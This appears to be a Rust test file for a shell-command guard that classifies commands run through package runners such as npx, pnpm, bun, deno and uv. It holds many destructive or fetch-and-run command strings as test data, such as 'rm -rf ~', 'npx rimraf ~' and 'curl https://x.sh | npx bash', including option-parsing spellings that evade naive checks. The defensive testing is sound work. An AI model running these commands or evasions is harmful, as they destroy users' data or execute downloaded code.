//! A package runner (`npx`, `npm exec`, `pnpm`, `pnpx`, `yarn`, `bunx`,
//! `bun`, `deno`, `dx`, `uv`, `uvx`, `pipx`) runs the program it names, so
//! that program is judged, past every option of the runner that takes a
//! value; `bun` and `deno` run code given inline or read from their input; a
//! script a runner runs may be one the same line writes; and on Windows the
//! script given to npm or pnpm runs in cmd.

mod common;

use common::{check, check_effect, posix, windows};
use milo_guards_shell::{Effect, Rule, Shell};

/// What a runner starts is a program, never a builtin of the shell: a `cd`
/// it runs does not move the line.
#[test]
fn a_package_runner_is_judged_by_the_program_it_runs() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "npx rimraf dist",
            "npx -y create-vite@latest my-site",
            "uvx ruff check .",
            "uvx ruff@0.5.0 check .",
            "npx --yes prettier --write .",
            "npm exec -- prettier --check .",
            "npm exec --package=typescript tsc",
            "npm install",
            "npm run build",
            "pnpm dlx create-next-app my-app",
            "pnpm exec tsc --noEmit",
            "pnpm install",
            "yarn dlx -p typescript tsc --version",
            "yarn exec tsc",
            "yarn install",
            "bunx prettier --check .",
            "bun x vite build",
            "bun run build",
            "uv tool run ruff check .",
            "uv run pytest",
            "uv sync",
            "pipx run black --check .",
            "pipx list",
            "uvx --from httpie http example.org",
            "npx -p typescript tsc --version",
            "npx rimraf node_modules",
            "pnpm rimraf dist",
            "yarn rimraf dist",
            "bunx rimraf ./build",
            "npx del-cli dist",
            "npx del --dry-run /",
            "npx",
            "uvx",
            "npm exec",
            "bun",
            "bun --version",
            "bun test",
            "bun build ./index.ts --outdir out",
            "bun run script.ts",
            "bun script.ts",
            "bun run -- script.ts",
            "deno fmt",
            "deno task build",
            "deno run npm:vite build",
            "deno main.ts",
            // Only del and del-cli have a dry run, and it is spelt out.
            "npx del-cli --dry-run /",
            "del --dry-run /",
            // `npx` hands the `--` on, so `sh` is given `--` and then reads
            // a script file called `-c`; the same after a `--` before `sh`.
            "npx sh -- -c 'rm -rf ~'",
            "npm exec -- sh -- -c 'rm -rf ~'",
            "npm exec stub -- --flag",
            // npm's call script, and a `-c` after the program, which is the
            // program's own.
            "npx -yc 'echo hi'",
            "npm exec -yc 'echo hi'",
            "npm -c 'echo hi' exec",
            "npx --c 'echo hi'",
            "npx prettier -c .",
            "npm exec prettier -- -c .",
            "npx -y prettier -c .",
            // pnpm's shell mode before `exec`.
            "pnpm -r exec tsc",
            "pnpm -c exec 'echo hi'",
            // `pnpx` and `pnx` are `pnpm dlx`.
            "pnpx create-vite my-site",
            "pnpx rimraf dist",
            "pnx rimraf dist",
            "pnpx -p typescript tsc --version",
            "pnpx --version",
            "pnpx cd ~ && ls",
            "pnx cd / && ls",
            // A bare pnpm name runs a script or else the program: read as
            // `pnpm exec NAME`, unless NAME is a command of pnpm ("If there
            // is no script with the specified name, then pnpm will execute
            // the command as a shell script").
            "pnpm lint",
            "pnpm dev",
            "pnpm build",
            "pnpm test",
            "pnpm start",
            "pnpm format --check",
            "pnpm --filter app lint",
            "pnpm -r build",
            "pnpm rm lodash",
            "pnpm remove lodash",
            "pnpm uninstall lodash",
            "pnpm un lodash",
            "pnpm add lodash",
            "pnpm i",
            "pnpm up",
            "pnpm update",
            "pnpm ls",
            "pnpm list",
            "pnpm env use --global lts",
            "pnpm store prune",
            "pnpm run build",
            "pnpm view react version",
            "pnpm --version",
            "pnpm echo hi",
            // `recursive`, `multi` and `m` are pnpm's own spellings of `-r`
            // (pnpm.io/cli/recursive): `pnpm recursive exec` is `pnpm -r exec`.
            "pnpm recursive exec tsc",
            "pnpm m exec tsc --noEmit",
            "pnpm multi exec -- tsc",
            "pnpm recursive install",
            "pnpm m run build",
            "pnpm multi test",
            "pnpm recursive",
            "pnpm recursive lint",
            "pnpm recursive exec",
            "pnpm exec m x",
            // `yarn exec` runs its arguments as a script; `yarn run` starts a
            // delete tool of the project like yarn does.
            "yarn exec tsc --noEmit",
            "yarn exec 'echo hi'",
            "yarn exec 'tsc & babel src --out-dir lib'",
            "yarn run rimraf dist",
            "yarn run build",
            "yarn run clean",
            "yarn run --silent build",
            // bun starts a delete tool of the project by its name.
            "bun rimraf dist",
            "bun run rimraf dist",
            "bun run clean",
            // `bun exec` runs its arguments as a shell script.
            "bun exec 'echo hi'",
            "bun exec",
            "bun --cwd x exec 'echo hi'",
            // `bun run` starts any program on the path that is no file. Names
            // of scripts: unknown programs.
            "bun run dev",
            "bun run start",
            "bun run test",
            "bun run lint",
            "bun run format",
            "bun run deploy",
            "bun run typecheck",
            "bun run test:unit",
            "bun run build -- --watch",
            "bun --hot run dev",
            "bun run --silent build",
            "bun run --bun dev",
            "bun run --filter app build",
            // Files.
            "bun run ./build.ts",
            "bun run src/main",
            "bun run echo.sh",
            // Known programs that only read.
            "bun run echo X",
            "bun run ls",
            "bun run git status",
            // `bun <name>` runs only scripts and local bins.
            "bun build",
            "bun sh -c 'rm -rf ~'",
            "bun rm -rf ~",
            // bun picks its subcommand before any option reads a value, so
            // `bun -F x echo RAN` runs `bunx echo RAN`, and `bun --title repl`
            // opens the REPL.
            "bun -F x echo RAN",
            "bun --filter x echo RAN",
            "bun --cwd app run build",
            "bun -F app run build",
            "bun --filter app test",
            "bun -c x vite build",
            // deno runs a script when it is given no subcommand; `deno x`
            // and `dx` are package runners; its help and version flags only
            // print.
            "deno npm:vite build",
            "deno -A main.ts",
            "deno watch main.ts",
            "deno watch --allow-all main.ts",
            "deno x prettier --check .",
            "dx prettier --check .",
            "deno x -y prettier .",
            "deno x npm:prettier .",
            "dx",
            "deno x",
            "dx -p typescript tsc --version",
            "deno -v",
            "deno --help=full",
            "deno --help=unstable",
            // A plain `cd` still moves the shell.
            "cd src && rm -f target/x.o",
            "npx prettier --write src && ls",
        ],
        &[
            ("bunx rimraf /", Rule::Delete),
            ("pnpm dlx rimraf ~", Rule::Delete),
            ("npx rimraf ~", Rule::Delete),
            ("npx rimraf@5 ~", Rule::Delete),
            ("npx -y rimraf ~", Rule::Delete),
            ("npx --yes rimraf -- ~", Rule::Delete),
            ("npx rimraf --glob ~/*", Rule::Delete),
            ("npx -- rimraf ~", Rule::Delete),
            ("npx -p rimraf rimraf ~", Rule::Delete),
            ("npx --package=rimraf rimraf ~", Rule::Delete),
            ("npx --package rimraf rimraf ~", Rule::Delete),
            ("npx -y -p rimraf@5 rimraf ~", Rule::Delete),
            ("npx @scope/rimraf@1 ~", Rule::Delete),
            ("npm exec rimraf ~", Rule::Delete),
            ("npm exec -- rimraf ~", Rule::Delete),
            ("npm exec --package rimraf -- rimraf ~", Rule::Delete),
            ("npm x rimraf ~", Rule::Delete),
            ("pnpm exec rimraf ~", Rule::Delete),
            ("pnpm dlx -p rimraf rimraf ~", Rule::Delete),
            ("pnpm -C app exec rimraf ~", Rule::Delete),
            ("pnpm --filter app exec rimraf ~", Rule::Delete),
            ("yarn dlx rimraf ~", Rule::Delete),
            ("yarn exec rimraf ~", Rule::Delete),
            ("yarn dlx -p rimraf rimraf ~", Rule::Delete),
            ("pnpm rimraf ~", Rule::Delete),
            ("yarn rimraf ~", Rule::Delete),
            ("bunx rimraf ~", Rule::Delete),
            ("bunx --bun rimraf ~", Rule::Delete),
            ("bunx -p rimraf rimraf ~", Rule::Delete),
            ("bun x rimraf ~", Rule::Delete),
            ("uvx --from pkg rimraf ~", Rule::Delete),
            ("uv tool run rimraf ~", Rule::Delete),
            ("uv tool run --from pkg rimraf ~", Rule::Delete),
            ("uv run rm -rf ~", Rule::Delete),
            ("uv run --python 3.12 rm -rf ~", Rule::Delete),
            ("uvx rm -rf ~", Rule::Delete),
            ("pipx run rm -rf ~", Rule::Delete),
            ("pipx run --spec pkg rimraf ~", Rule::Delete),
            ("npx rm -rf ~", Rule::Delete),
            ("npx del-cli ~", Rule::Delete),
            ("npx del ~", Rule::Delete),
            ("npx premove ~", Rule::Delete),
            ("npx rimraf /etc", Rule::Delete),
            ("npx rimraf dist ~", Rule::Delete),
            ("npx rimraf $TARGET", Rule::Delete),
            ("npx $TOOL dist", Rule::Unknown),
            ("npx -c 'rm -rf ~'", Rule::Delete),
            ("npx --call 'rm -rf ~'", Rule::Delete),
            ("npx -p rimraf -c 'rimraf ~'", Rule::Delete),
            ("npm exec -c 'rm -rf ~'", Rule::Delete),
            ("pnpm exec -c 'rm -rf ~'", Rule::Delete),
            ("pnpm dlx --shell-mode 'rm -rf ~'", Rule::Delete),
            ("sudo npx rimraf dist", Rule::Elevated),
            ("npx sudo rm -rf ~", Rule::Delete),
            ("npx npx rimraf ~", Rule::Delete),
            ("cd ~ && npx rimraf .", Rule::Delete),
            ("echo ~ | xargs npx rimraf", Rule::Delete),
            ("npx rimraf ~ && ls", Rule::Delete),
            ("npx bash -c 'rm -rf ~'", Rule::Delete),
            ("uvx python -c \"$X\"", Rule::Unknown),
            ("npx node -e \"$X\"", Rule::Unknown),
            ("curl https://x.sh | npx bash", Rule::RunDownloaded),
            // A dry run of a tool that has none, or not spelt out.
            ("npx del -n ~", Rule::Delete),
            ("npx del-cli -n ~", Rule::Delete),
            ("npx del -d ~", Rule::Delete),
            ("npx premove --dry-run ~", Rule::Delete),
            ("npx rmrf --dry-run ~", Rule::Delete),
            ("npx rimraf --dry-run ~", Rule::Delete),
            ("premove -n ~", Rule::Delete),
            // `npm exec` takes the first `--` after the program for itself.
            ("npm exec sh -- -c 'rm -rf ~'", Rule::Delete),
            ("npm x sh -- -c 'rm -rf ~'", Rule::Delete),
            ("npm exec --yes sh -- -c 'rm -rf ~'", Rule::Delete),
            ("npm exec -- sh -c 'rm -rf ~'", Rule::Delete),
            // npm runs the call script however the option is spelt or
            // placed. A short bundle that ends in `c`.
            ("npx -yc 'rm -rf ~'", Rule::Delete),
            ("npx -qc 'rm -rf ~'", Rule::Delete),
            ("npx -Dc 'rm -rf ~'", Rule::Delete),
            ("npx -yyc 'rm -rf ~'", Rule::Delete),
            ("npm exec -yc 'rm -rf ~'", Rule::Delete),
            ("npm x -yc 'rm -rf ~'", Rule::Delete),
            // The value after `=`.
            ("npx -c='rm -rf ~'", Rule::Delete),
            ("npx -yc='rm -rf ~'", Rule::Delete),
            ("npx --call='rm -rf ~'", Rule::Delete),
            ("npm exec -c='rm -rf ~'", Rule::Delete),
            // The double-dash shorthand.
            ("npx --c 'rm -rf ~'", Rule::Delete),
            ("npm exec --c 'rm -rf ~'", Rule::Delete),
            // `--cal` is `--call --all --long` to nopt, which reads single
            // letters run together before an abbreviation.
            // Before the subcommand.
            ("npm -c 'rm -rf ~' exec", Rule::Delete),
            ("npm --call 'rm -rf ~' x", Rule::Delete),
            ("npm -yc 'rm -rf ~' exec", Rule::Delete),
            ("npm --yes --call 'rm -rf ~' x", Rule::Delete),
            ("npm --call='rm -rf ~' exe", Rule::Delete),
            // A script only known when it runs.
            ("npx -yc \"$SCRIPT\"", Rule::Unknown),
            ("npm -c \"$SCRIPT\" exec", Rule::Unknown),
            // Still a script after other options, and the program is not run.
            ("npx -y -c 'rm -rf ~' prettier", Rule::Delete),
            ("sudo npx -yc 'rm -rf ~'", Rule::Delete),
            // pnpm reads shell mode before `exec` as well.
            ("pnpm -c exec 'rm -rf ~'", Rule::Delete),
            ("pnpm --shell-mode exec 'rm -rf ~'", Rule::Delete),
            ("pnpm -r -c exec 'rm -rf ~'", Rule::Delete),
            ("pnpm -C app -c exec 'rm -rf ~'", Rule::Delete),
            (
                "pnpm --filter app --shell-mode exec 'rm -rf ~'",
                Rule::Delete,
            ),
            ("pnpm -c dlx 'rm -rf ~'", Rule::Delete),
            // `pnpx` and `pnx`.
            ("pnpx rimraf ~", Rule::Delete),
            ("pnx rimraf ~", Rule::Delete),
            ("pnpx rimraf@5 ~", Rule::Delete),
            ("pnpx -p rimraf rimraf ~", Rule::Delete),
            ("pnpx -c \"rm -rf ~\"", Rule::Delete),
            ("pnx -c 'rm -rf ~'", Rule::Delete),
            ("pnpx --shell-mode 'rm -rf ~'", Rule::Delete),
            ("pnpx sh -c 'rm -rf ~'", Rule::Delete),
            ("pnpx node -e \"$X\"", Rule::Unknown),
            ("sudo pnpx rimraf ~", Rule::Elevated),
            // A bare pnpm name.
            ("pnpm sh -c \"rm -rf ~\"", Rule::Delete),
            ("pnpm bash -c 'rm -rf ~'", Rule::Delete),
            ("pnpm find ~ -delete", Rule::Delete),
            ("pnpm shred ~/x", Rule::Delete),
            ("pnpm git clean -fdx", Rule::GitDiscard),
            ("pnpm -C app sh -c 'rm -rf ~'", Rule::Delete),
            ("pnpm --filter app find ~ -delete", Rule::Delete),
            ("pnpm node -e \"$X\"", Rule::Unknown),
            ("sudo pnpm sh -c 'rm -rf ~'", Rule::Elevated),
            // pnpm's spellings of `-r`.
            ("pnpm -r exec rm -rf ~", Rule::Delete),
            ("pnpm recursive exec rm -rf ~", Rule::Delete),
            ("pnpm m exec rm -rf ~", Rule::Delete),
            ("pnpm multi exec rm -rf ~", Rule::Delete),
            ("pnpm recursive exec -- rm -rf ~", Rule::Delete),
            ("pnpm -C app recursive exec rm -rf ~", Rule::Delete),
            ("pnpm recursive --filter app exec rm -rf ~", Rule::Delete),
            ("pnpm recursive dlx rimraf ~", Rule::Delete),
            ("pnpm multi exec rimraf ~", Rule::Delete),
            ("pnpm recursive exec -c 'rm -rf ~'", Rule::Delete),
            ("pnpm recursive -c exec 'rm -rf ~'", Rule::Delete),
            ("pnpm recursive sh -c 'rm -rf ~'", Rule::Delete),
            ("pnpm m rimraf ~", Rule::Delete),
            ("pnpm recursive exec $TOOL", Rule::Unknown),
            // `yarn exec` and `yarn run`.
            ("yarn exec 'rm -rf /home/me'", Rule::Delete),
            ("yarn exec rm -rf ~", Rule::Delete),
            ("yarn exec 'tsc && rm -rf ~'", Rule::Delete),
            ("yarn exec 'ls & rm -rf ~'", Rule::Delete),
            ("yarn --cwd app exec 'rm -rf ~'", Rule::Delete),
            ("yarn exec 'bash -c \"rm -rf ~\"'", Rule::Delete),
            ("yarn exec $TOOL", Rule::Unknown),
            ("yarn run rimraf ~", Rule::Delete),
            ("yarn run --silent rimraf ~", Rule::Delete),
            ("yarn --cwd app run rimraf ~", Rule::Delete),
            ("yarn run del-cli ~", Rule::Delete),
            ("yarn run premove ~", Rule::Delete),
            ("sudo yarn run rimraf ~", Rule::Delete),
            // bun starts a delete tool of the project by its name.
            ("bun rimraf ~", Rule::Delete),
            ("bun run rimraf ~", Rule::Delete),
            ("bun run --silent rimraf ~", Rule::Delete),
            ("bun --hot run rimraf ~", Rule::Delete),
            ("bun -d x:1 rimraf ~", Rule::Delete),
            ("bun run --cwd app rimraf ~", Rule::Delete),
            ("bun del-cli ~", Rule::Delete),
            ("bun run premove ~", Rule::Delete),
            ("sudo bun rimraf dist", Rule::Elevated),
            // `bun exec`.
            ("bun exec 'rm -rf ~'", Rule::Delete),
            ("bun --cwd x exec 'rm -rf ~'", Rule::Delete),
            ("bun --silent exec 'rm -rf ~'", Rule::Delete),
            ("bun exec --silent 'rm -rf ~'", Rule::Delete),
            ("bun exec 'ls && rm -rf ~'", Rule::Delete),
            ("bun exec rm -rf ~", Rule::Delete),
            ("sudo bun exec 'rm -rf ~'", Rule::Delete),
            // `bun run` of a program on the path.
            ("bun run rm -rf ~", Rule::Delete),
            ("bun run sh -c 'rm -rf ~'", Rule::Delete),
            ("bun run bash -c 'rm -rf ~'", Rule::Delete),
            ("bun run --silent bash -c 'rm -rf ~'", Rule::Delete),
            ("bun --hot run rm -rf ~", Rule::Delete),
            ("bun run --bun rm -rf ~", Rule::Delete),
            ("bun run --cwd app rm -rf ~", Rule::Delete),
            ("bun --cwd app run rm -rf ~", Rule::Delete),
            ("bun run -- rm -rf ~", Rule::Delete),
            ("sudo bun run rm -rf ~", Rule::Delete),
            ("bun run $TOOL dist", Rule::Unknown),
            ("bun run node -e \"$X\"", Rule::Unknown),
            ("echo ~ | xargs bun run rm -rf", Rule::Delete),
            // The first word without a dash is bun's subcommand.
            ("bun -F x rm -rf ~", Rule::Delete),
            ("bun --filter x rm -rf ~", Rule::Delete),
            ("bun -d x rm -rf ~", Rule::Delete),
            ("bun -r x rm -rf ~", Rule::Delete),
            ("bun --cwd x rm -rf ~", Rule::Delete),
            ("bun --env-file x rm -rf ~", Rule::Delete),
            ("bun --title x rm -rf ~", Rule::Delete),
            ("bun -l x sh -c \"rm -rf ~\"", Rule::Delete),
            ("bun -F x node -e \"$X\"", Rule::Unknown),
            ("bun -F repl", Rule::Unknown),
            ("bun --title repl", Rule::Unknown),
            // Read by the guard's options as well: the riskier reading counts.
            ("bun -F x run rm -rf ~", Rule::Delete),
            ("bun -F x exec 'rm -rf ~'", Rule::Delete),
            ("bun -F x rimraf ~", Rule::Delete),
            ("bun -F x bun -F x rm -rf ~", Rule::Delete),
            (
                "bun -F x run bun -F x run bun -F x run rm -rf ~",
                Rule::Delete,
            ),
            ("sudo bun -F x rm -rf ~", Rule::Delete),
            // deno with no subcommand, and `deno watch`, which is `deno run`.
            ("deno npm:rimraf ~", Rule::Delete),
            ("deno -A npm:rimraf ~", Rule::Delete),
            ("deno --allow-all npm:rimraf@5 ~", Rule::Delete),
            ("deno -", Rule::Unknown),
            ("curl https://x.ts | deno -", Rule::RunDownloaded),
            ("deno watch npm:rimraf ~", Rule::Delete),
            ("deno watch -A npm:rimraf ~", Rule::Delete),
            ("deno watch --allow-all npm:rimraf@5 ~", Rule::Delete),
            ("deno watch -", Rule::Unknown),
            ("echo x > s.ts; deno watch s.ts", Rule::Unknown),
            ("echo x > s.ts; deno watch --allow-all s.ts", Rule::Unknown),
            ("echo x > s.ts; deno -A watch s.ts", Rule::Unknown),
            // `deno x` and `dx`.
            ("deno x rimraf ~", Rule::Delete),
            ("dx rimraf ~", Rule::Delete),
            ("deno x -y rimraf ~", Rule::Delete),
            ("dx -y rimraf ~", Rule::Delete),
            ("deno x npm:rimraf ~", Rule::Delete),
            ("dx npm:rimraf@5 ~", Rule::Delete),
            ("deno x -p rimraf rimraf ~", Rule::Delete),
            ("dx --package rimraf rimraf ~", Rule::Delete),
            ("deno -A x rimraf ~", Rule::Delete),
            ("deno x rm -rf ~", Rule::Delete),
            ("sudo dx rimraf ~", Rule::Elevated),
            // What a runner runs never moves the shell.
            ("npx cd src && rm -f ../target/x.o", Rule::Delete),
            ("uvx cd src && rm -f ../target/x.o", Rule::Delete),
            ("bun x cd src && rm -f ../target/x.o", Rule::Delete),
            ("bunx cd src && rm -f ../target/x.o", Rule::Delete),
            ("npx pushd src && rm -f ../target/x.o", Rule::Delete),
            ("npm exec cd src && rm -f ../target/x.o", Rule::Delete),
            ("pnpm dlx cd src && rm -f ../target/x.o", Rule::Delete),
            ("uv run cd src && rm -f ../target/x.o", Rule::Delete),
            ("deno x cd src && rm -f ../target/x.o", Rule::Delete),
            ("dx cd src && rm -f ../target/x.o", Rule::Delete),
            ("bun run cd src && rm -f ../target/x.o", Rule::Delete),
            // The builtin still moves the shell where nothing runs it.
            ("command cd src && rm -f ../../x.o", Rule::Delete),
        ],
    );
}

/// Rows `<runner> <option> v <program line>`, one per option.
fn with_each(runner: &str, options: &[&str], line: &str, rule: Rule) -> Vec<(String, Rule)> {
    options
        .iter()
        .map(|option| (format!("{runner} {option} v {line}"), rule))
        .collect()
}

/// The risky rows as the `check` table takes them.
fn as_rows(rows: &[(String, Rule)]) -> Vec<(&str, Rule)> {
    rows.iter()
        .map(|(line, rule)| (line.as_str(), *rule))
        .collect()
}

/// Every setting of npm's config that is not a boolean, from its definitions,
/// and the shorthands that point at them.
const NPM_VALUE_OPTIONS: [&str; 56] = [
    "--access",
    "--auth-type",
    "--ca",
    "--cert",
    "--key",
    "--cidr",
    "--cpu",
    "--os",
    "--libc",
    "--depth",
    "--diff",
    "--diff-dst-prefix",
    "--diff-src-prefix",
    "--diff-unified",
    "--editor",
    "--git",
    "--heading",
    "--init-author-name",
    "--init-author-email",
    "--init-author-url",
    "--init-license",
    "--init-module",
    "--init-type",
    "--init-version",
    "--local-address",
    "--lockfile-version",
    "--logs-dir",
    "--logs-max",
    "--message",
    "-m",
    "--node-gyp",
    "--pack-destination",
    "--preid",
    "--replace-registry-host",
    "--save-prefix",
    "--sbom-format",
    "--sbom-type",
    "--searchexclude",
    "--searchlimit",
    "--searchopts",
    "--searchstaleness",
    "--tag-version-prefix",
    "--umask",
    "--user-agent",
    "--viewer",
    "--which",
    "--expect-result-count",
    "--min-release-age",
    "--allow-git",
    "--allow-file",
    "--allow-remote",
    "--allow-directory",
    "-L",
    "--registry",
    "--prefix",
    "-C",
];

/// A row for every option of each runner that takes a value, with a value
/// and then a delete tool (or inline code) after it.
fn value_option_rows() -> Vec<(String, Rule)> {
    let mut risky = Vec::new();
    // npm and npx: every setting that takes a value.
    for runner in ["npx", "npm exec", "npm x"] {
        risky.extend(with_each(
            runner,
            &NPM_VALUE_OPTIONS,
            "rimraf ~",
            Rule::Delete,
        ));
    }
    // pipx.
    for option in [
        "-i",
        "--index-url",
        "--fetch-python",
        "--backend",
        "--cooldown",
        "--python-args",
        "--with",
        "--spec",
        "--python",
        "--pip-args",
    ] {
        risky.push((format!("pipx run {option} x rimraf ~"), Rule::Delete));
    }
    // pnpm's own string and number settings.
    for option in [
        "--store-dir",
        "--virtual-store-dir",
        "--modules-dir",
        "--lockfile-dir",
        "--cache-dir",
        "--global-dir",
        "--state-dir",
        "--workspace-concurrency",
        "--network-concurrency",
        "--child-concurrency",
        "--test-pattern",
        "--changed-files-ignore-pattern",
        "--node-linker",
        "--package-import-method",
        "--resolution-mode",
        // pnpm reads npm's settings too.
        "--user-agent",
        "--fetch-retries",
        "--otp",
    ] {
        risky.push((format!("pnpm {option} x exec rimraf ~"), Rule::Delete));
        risky.push((format!("pnpm exec {option} x rimraf ~"), Rule::Delete));
        risky.push((format!("pnpm dlx {option} x rimraf ~"), Rule::Delete));
    }
    // yarn's global options.
    for option in [
        "--cache-folder",
        "--modules-folder",
        "--global-folder",
        "--link-folder",
        "--preferred-cache-folder",
        "--mutex",
        "--network-timeout",
        "--network-concurrency",
        "--registry",
        "--proxy",
        "--https-proxy",
        "--otp",
        "--use-yarnrc",
        "--cwd",
    ] {
        risky.push((format!("yarn {option} x exec rimraf ~"), Rule::Delete));
        risky.push((format!("yarn {option} x dlx rimraf ~"), Rule::Delete));
        risky.push((format!("yarn {option} x exec 'rm -rf ~'"), Rule::Delete));
    }
    // deno.
    for option in [
        "--preload",
        "--import",
        "--require",
        "--conditions",
        "--min-dep-age",
        "--minimum-dependency-age",
        "--cpu-prof-dir",
        "--cpu-prof-name",
        "--cpu-prof-interval",
        "--inspect-publish-uid",
    ] {
        risky.push((format!("deno run {option} p npm:rimraf ~"), Rule::Delete));
        risky.push((format!("deno {option} p npm:rimraf ~"), Rule::Delete));
        risky.push((format!("deno {option} p eval 'x'"), Rule::Unknown));
    }
    // The hidden options uv still takes a value for.
    for option in [
        "--python-preference",
        "--python-fetch",
        "--max-recursion-depth",
        "--preview-feature",
        "--preview-features",
        "--trusted-host",
    ] {
        risky.push((format!("uv run {option} x rm -rf ~"), Rule::Delete));
        risky.push((format!("uv tool run {option} x rimraf ~"), Rule::Delete));
        risky.push((format!("uvx {option} x rimraf ~"), Rule::Delete));
    }
    risky
}

/// A runner's option that takes a value takes the word after it, however
/// the option is spelt; one that does not leaves that word as the program.
#[test]
fn a_package_runner_skips_every_option_that_takes_a_value() {
    let generated = value_option_rows();
    let mut risky: Vec<(&str, Rule)> = vec![
        // npm and npx.
        ("npx --editor vim rimraf ~", Rule::Delete),
        ("npx --logs-dir x rimraf ~", Rule::Delete),
        ("npx --cpu x rimraf ~", Rule::Delete),
        ("npx --git git rimraf ~", Rule::Delete),
        ("npx -L project rimraf ~", Rule::Delete),
        ("npx --depth 1 rimraf ~", Rule::Delete),
        ("npm --editor vim exec rimraf ~", Rule::Delete),
        ("npm -m msg exec rimraf ~", Rule::Delete),
        // npm's short prefix and node options.
        ("npm -C foo exec rimraf ~", Rule::Delete),
        ("npm -C x exec rimraf ~", Rule::Delete),
        ("npx -C foo rimraf ~", Rule::Delete),
        ("npx --node-options x rimraf ~", Rule::Delete),
        ("npx --node-options --no-warnings rimraf ~", Rule::Delete),
        ("npm exec --node-options x rimraf ~", Rule::Delete),
        ("npx --include dev rimraf ~", Rule::Delete),
        ("npx --omit dev rimraf ~", Rule::Delete),
        ("npx --tag next rimraf ~", Rule::Delete),
        ("npx --before 2030-01-01 rimraf ~", Rule::Delete),
        ("npx --location project rimraf ~", Rule::Delete),
        ("npx --scope @s rimraf ~", Rule::Delete),
        ("npx --otp 123456 rimraf ~", Rule::Delete),
        ("npx --fetch-retries 1 rimraf ~", Rule::Delete),
        ("npx --install-strategy hoisted rimraf ~", Rule::Delete),
        // npm reads an option spelt short or run together like npm does. An
        // unambiguous start of an option's name is the option.
        ("npx --ed vim rimraf ~", Rule::Delete),
        ("npm exec --ed vim rimraf ~", Rule::Delete),
        ("npx --pack-d dir rimraf ~", Rule::Delete),
        ("npm exec --reg http://x rimraf ~", Rule::Delete),
        // `--pre` starts several names: it is no option, takes nothing.
        ("npm exec --pre rimraf ~", Rule::Delete),
        // `npm exec` reads a boolean's `true` or `false`; `-p` is
        // `--parseable` there and `--package` for `npx`.
        ("npm exec --yes false rimraf ~", Rule::Delete),
        ("npm exec -y true rimraf ~", Rule::Delete),
        ("npm exec --browser x rimraf ~", Rule::Delete),
        ("npm exec --color always rimraf ~", Rule::Delete),
        ("npm exec -p rimraf ~", Rule::Delete),
        // A word `npx` takes for a value that `npm exec` does not is the
        // program: `npx --foo prog` runs `prog`.
        ("npx --foo rimraf ~", Rule::Delete),
        ("npx --no-warnings rimraf ~", Rule::Delete),
        ("npx --exe rimraf ~", Rule::Delete),
        ("npm exe rimraf ~", Rule::Delete),
        ("npx --foo rimraf ~ ; rm -rf ~", Rule::Delete),
        // What `npx` rewrites or takes out, with the word after it.
        ("npx -n x rimraf ~", Rule::Delete),
        ("npx --npm x rimraf ~", Rule::Delete),
        ("npx --node-arg x rimraf ~", Rule::Delete),
        ("npx --shell sh rimraf ~", Rule::Delete),
        ("npx --no-install rimraf ~", Rule::Delete),
        ("npx --always-spawn rimraf ~", Rule::Delete),
        ("npx -q rimraf ~", Rule::Delete),
        ("npx -d rimraf ~", Rule::Delete),
        ("npx -C=app rimraf ~", Rule::Delete),
        ("npm exec -yg rimraf ~", Rule::Delete),
        // An option name that is not ASCII is no option, and no panic.
        ("npm exec --ééé rimraf ~", Rule::Delete),
        ("npx --ééé rimraf ~", Rule::Delete),
        // pipx: a flag, not an option that takes a value: `rimraf` is the
        // program.
        ("pipx run --fetch-missing-python rimraf ~", Rule::Delete),
        // pnpm.
        ("pnpm exec --resume-from a rimraf ~", Rule::Delete),
        ("pnpm dlx --allow-build esbuild rimraf ~", Rule::Delete),
        // `-w` is `--workspace-root` for pnpm, a flag.
        ("pnpm -w exec rimraf ~", Rule::Delete),
        // uv skips every option that takes a value, hidden ones too.
        ("uv run --group dev rm -rf ~", Rule::Delete),
        ("uv run --no-group dev rm -rf ~", Rule::Delete),
        ("uv run --only-group dev rm -rf ~", Rule::Delete),
        ("uv run --extra dev rm -rf ~", Rule::Delete),
        ("uv run --no-extra dev rm -rf ~", Rule::Delete),
        ("uv run --no-editable-package p rm -rf ~", Rule::Delete),
        ("uv run --upgrade-group g rm -rf ~", Rule::Delete),
        ("uv run --prerelease-package p rm -rf ~", Rule::Delete),
        ("uv run --fork-strategy fewest rm -rf ~", Rule::Delete),
        (
            "uv run --exclude-newer-package p=2030-01-01 rm -rf ~",
            Rule::Delete,
        ),
        ("uv run --no-sources-package p rm -rf ~", Rule::Delete),
        (
            "uv run --config-settings-package p=k=v rm -rf ~",
            Rule::Delete,
        ),
        (
            "uv run --no-build-isolation-package p rm -rf ~",
            Rule::Delete,
        ),
        ("uv run --no-build-package p rm -rf ~", Rule::Delete),
        ("uv run --no-binary-package p rm -rf ~", Rule::Delete),
        ("uv run -b c.txt rm -rf ~", Rule::Delete),
        ("uv run --build-constraints c.txt rm -rf ~", Rule::Delete),
        ("uv run --torch-backend cpu rm -rf ~", Rule::Delete),
        ("uv tool run --torch-backend cpu rimraf ~", Rule::Delete),
        ("uvx --torch-backend cpu rimraf ~", Rule::Delete),
        ("uvx -b c.txt rimraf ~", Rule::Delete),
        ("uv --directory app run --group dev rm -rf ~", Rule::Delete),
        (
            "uv run --python-preference only-managed rm -rf ~",
            Rule::Delete,
        ),
        // deno takes `--reload` and `--env-file` only with an equals sign.
        ("deno run --reload npm:rimraf ~", Rule::Delete),
        ("deno run -r npm:rimraf ~", Rule::Delete),
        ("deno run --env-file npm:rimraf ~", Rule::Delete),
        ("deno run --env-file=.env npm:rimraf ~", Rule::Delete),
        ("deno run --ext ts npm:rimraf ~", Rule::Delete),
        ("deno run -L debug npm:rimraf ~", Rule::Delete),
        ("deno run --log-level debug npm:rimraf ~", Rule::Delete),
        ("deno --reload eval \"$X\"", Rule::Unknown),
        // bun reads an option that takes a value before it looks for code.
        ("bun -d x:1 -e 'console.log(1)'", Rule::Unknown),
        ("bun --define x:1 -e 'x'", Rule::Unknown),
        ("bun -l .js:jsx -e 'x'", Rule::Unknown),
        ("bun --tsconfig-override t.json -e 'x'", Rule::Unknown),
        ("bun --install fallback -e 'x'", Rule::Unknown),
        ("bun --conditions c -e \"$X\"", Rule::Unknown),
        ("bun --main-fields main -e 'x'", Rule::Unknown),
        ("bun --extension-order .ts -e 'x'", Rule::Unknown),
        ("bun --jsx-factory h -e 'x'", Rule::Unknown),
        ("bun --jsx-fragment F -e 'x'", Rule::Unknown),
        ("bun --jsx-import-source react -e 'x'", Rule::Unknown),
        ("bun --jsx-runtime classic -e 'x'", Rule::Unknown),
        ("bun --drop console -e 'x'", Rule::Unknown),
